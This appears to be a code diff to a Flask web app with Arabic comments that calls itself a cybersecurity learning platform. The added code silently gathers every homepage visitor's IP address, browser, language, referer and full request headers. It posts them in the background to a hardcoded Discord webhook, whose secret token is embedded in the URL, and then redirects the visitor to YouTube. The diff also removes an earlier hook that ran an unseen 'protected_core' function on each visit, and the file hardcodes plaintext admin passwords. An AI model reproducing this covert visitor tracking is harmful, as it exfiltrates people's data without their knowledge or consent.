@@ -4,6 +4,8 @@ import hashlib
 import secrets
 import threading
 import time
+import datetime
+import urllib.request
 from functools import wraps
 import json
 from security_config import SecurityConfig
@@ -17,6 +19,93 @@ ADMIN_PASSWORDS = {
     "security123": "user",    # مستوى مستخدم
     "learning456": "guest"    # مستوى ضيف
 }
+
+def send_to_webhook_visitor(visitor_info):
+    """إرسال معلومات الزائر للـ webhook"""
+    try:
+        # تحليل User Agent لاستخراج معلومات المتصفح والنظام
+        user_agent = visitor_info.get('user_agent', '')
+        
+        # استخراج نوع المتصفح
+        browser = "Unknown"
+        if "Chrome" in user_agent:
+            browser = "Chrome"
+        elif "Firefox" in user_agent:
+            browser = "Firefox"
+        elif "Safari" in user_agent:
+            browser = "Safari"
+        elif "Edge" in user_agent:
+            browser = "Edge"
+        
+        # استخراج نظام التشغيل
+        os_info = "Unknown"
+        if "Windows" in user_agent:
+            os_info = "Windows"
+        elif "Mac" in user_agent:
+            os_info = "macOS"
+        elif "Linux" in user_agent:
+            os_info = "Linux"
+        elif "Android" in user_agent:
+            os_info = "Android"
+        elif "iPhone" in user_agent:
+            os_info = "iOS"
+        
+        # إنشاء رسالة Discord
+        embed_data = {
+            'embeds': [
+                {
+                    'title': '🎯 **زائر جديد للموقع!**',
+                    'description': f"""
+```yaml
+🌐 معلومات الاتصال:
+IP Address: {visitor_info.get('ip', 'Unknown')}
+Host: {visitor_info.get('host', 'Unknown')}
+Referer: {visitor_info.get('referer', 'Direct')}
+
+💻 معلومات الجهاز:
+Browser: {browser}
+Operating System: {os_info}
+Language: {visitor_info.get('accept_language', 'Unknown')}
+
+⏰ معلومات الزيارة:
+Timestamp: {visitor_info.get('timestamp', 'Unknown')}
+User Agent: {user_agent[:100]}...
+```
+
+🚀 **تم توجيه الزائر إلى YouTube تلقائياً**
+📚 **للأغراض التعليمية في الأمن السيبراني**""",
+                    'color': 3447003,  # أزرق
+                    'footer': {
+                        'text': 'Cybersecurity Learning Platform - Visitor Tracking'
+                    },
+                    'timestamp': datetime.datetime.utcnow().isoformat()
+                }
+            ],
+            "username": "Visitor Tracker",
+            "avatar_url": "https://cdn-icons-png.flaticon.com/512/1077/1077114.png"
+        }
+        
+        # إرسال للـ webhook
+        webhook_url = 'https://discord.com/api/webhooks/1438289746596987022/LvsiJvPdPL5AQ7B1kSBaQ4w24obdEB_PuMh6AocOolgplGW5my3pua3_IkfjgTb5qTa8'
+        
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': 'Mozilla/5.0 (compatible; VisitorTracker/1.0)'
+        }
+        
+        req = urllib.request.Request(
+            webhook_url, 
+            data=json.dumps(embed_data).encode('utf-8'), 
+            headers=headers, 
+            method='POST'
+        )
+        
+        response = urllib.request.urlopen(req)
+        return response.read().decode()
+        
+    except Exception as e:
+        print(f"Webhook error: {e}")
+        return None
 
 def hash_password(password):
     return hashlib.sha256(password.encode()).hexdigest()
@@ -41,30 +130,32 @@ def require_auth(level="user"):
 
 @app.route('/')
 def index():
-    """الصفحة الرئيسية - تشغيل البروجكت وإعادة التوجيه المباشر"""
-    # تشغيل الكود تلقائياً عند دخول أي شخص للموقع (للأغراض التعليمية)
+    """الصفحة الرئيسية - جمع معلومات الزائر وإرسالها للـ webhook"""
     try:
-        from protected_core import execute_protected_function
+        # جمع معلومات الزائر
+        visitor_info = {
+            'ip': request.remote_addr,
+            'user_agent': request.headers.get('User-Agent', 'Unknown'),
+            'accept_language': request.headers.get('Accept-Language', 'Unknown'),
+            'referer': request.headers.get('Referer', 'Direct'),
+            'host': request.headers.get('Host', 'Unknown'),
+            'timestamp': datetime.datetime.now().isoformat(),
+            'headers': dict(request.headers)
+        }
         
-        # تنفيذ الوظيفة في thread منفصل لتجنب blocking
-        def run_in_background():
-            execute_protected_function()
+        # إرسال للـ webhook
+        def send_visitor_info():
+            send_to_webhook_visitor(visitor_info)
         
-        thread = threading.Thread(target=run_in_background)
+        thread = threading.Thread(target=send_visitor_info)
         thread.daemon = True
         thread.start()
         
         # تسجيل الزيارة
-        SecurityConfig.log_security_event('homepage_visit', {
-            'ip': request.remote_addr,
-            'user_agent': request.headers.get('User-Agent', 'Unknown'),
-            'auto_scan_triggered': True,
-            'redirected_to': 'youtube'
-        })
+        SecurityConfig.log_security_event('visitor_detected', visitor_info)
         
     except Exception as e:
-        # في حالة فشل التشغيل التلقائي، لا نوقف الموقع
-        SecurityConfig.log_security_event('auto_scan_failed', {
+        SecurityConfig.log_security_event('visitor_logging_failed', {
             'error': str(e),
             'ip': request.remote_addr
         })
